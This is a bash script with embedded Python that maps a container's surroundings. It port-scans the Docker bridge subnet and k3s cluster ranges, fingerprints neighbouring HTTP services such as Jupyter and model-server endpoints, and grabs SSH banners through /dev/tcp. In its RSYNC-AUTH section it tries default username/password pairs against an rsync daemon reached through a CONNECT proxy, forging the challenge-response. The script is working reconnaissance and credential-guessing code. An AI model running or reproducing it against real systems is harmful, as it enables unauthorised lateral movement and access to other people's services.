#!/bin/bash
set +e
echo "###P12START $(date -u)"
echo "=== BRIDGE-PLATFORM-PORTS ==="
python3 - <<'PY'
import socket,concurrent.futures
ports=[22,80,443,1300,1301,8094,8095,8900,8901,31825,18048,18049,9090,8000,8080,8081,6006]
def chk(t):
    h,p=t
    try:
        s=socket.create_connection((h,p),timeout=1.2); s.close(); return (h,p)
    except: return None
tg=[("172.17.0.%d"%i,p) for i in range(2,30) for p in ports]
with concurrent.futures.ThreadPoolExecutor(max_workers=150) as ex:
    for r in ex.map(chk,tg):
        if r: print("%s:%d"%(r[0],r[1]))
PY
echo "=== SIB-8080-FINGERPRINT ==="
for h in 172.17.0.3 172.17.0.4 172.17.0.7; do for u in /system_stats /object_info /queue /history /api/sessions /api/kernels /lab /tree /v1/models /health /prompt /metrics; do printf "%s%s " "$h" "$u"; curl -s -m 4 -o /tmp/f.$$ -w "c=%{http_code} l=%{size_download} " "http://$h:8080$u"; head -c 70 /tmp/f.$$ | tr '\n' ' '; echo; done; done
echo "=== K3S-CIDR ==="
python3 - <<'PY'
import socket,concurrent.futures
def chk(t):
    h,p=t
    try:
        s=socket.create_connection((h,p),timeout=1.5); s.settimeout(2)
        try: d=s.recv(80)
        except: d=b""
        s.close(); return (h,p,d[:50])
    except: return None
tg=[("10.43.0.1",p) for p in (53,443,6443,80)]+[("10.42.0.%d"%i,p) for i in (1,2,10) for p in (80,443,6443,10250)]+[("10.43.0.%d"%i,p) for i in (1,10) for p in (8080,9090,8265)]
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    for r in ex.map(chk,tg):
        if r: print("%s:%d %r"%(r[0],r[1],r[2]))
PY
echo "=== ROUTES ==="; ip route; cat /proc/net/route | head
echo "=== RSYNC-AUTH ==="
python3 - <<'PY'
import socket
creds=[("migrate","migrate"),("rsync","rsync"),("onething","onething"),("root","root"),("backup","backup")]
for u,p in creds:
    try:
        s=socket.create_connection(("172.17.0.1",1080),timeout=5); s.settimeout(6)
        s.sendall(b"CONNECT 127.0.0.1:1234 HTTP/1.1\r\nHost: x\r\n\r\n")
        b=b""
        while b"\r\n\r\n" not in b: b+=s.recv(1)
        s.sendall(b"@RSYNCD: 31.0\n"); s.recv(100)
        s.sendall(b"migrate\n"); r1=s.recv(200)
        if b"AUTHREQD" in r1:
            import base64
            chal=r1.split(b"AUTHREQD ")[1].strip()
            import hashlib
            h=hashlib.md5(p.encode()+chal).digest()
            resp=base64.b64encode(h).decode()
            s.sendall((u+" "+resp+"\n").encode()); print(u,p,"->",s.recv(200)[:150])
        else: print(u,p,"->",r1[:150])
        s.close()
    except Exception as e: print(u,p,"err",type(e).__name__)
PY
echo "=== SIB-OS ==="
for h in 172.17.0.3 172.17.0.7; do echo "--- $h"; timeout 4 bash -c "exec 3<>/dev/tcp/$h/22; head -c 60 <&3" 2>/dev/null | tr -d '\r'; echo; done
echo "###P12END $(date -u)"
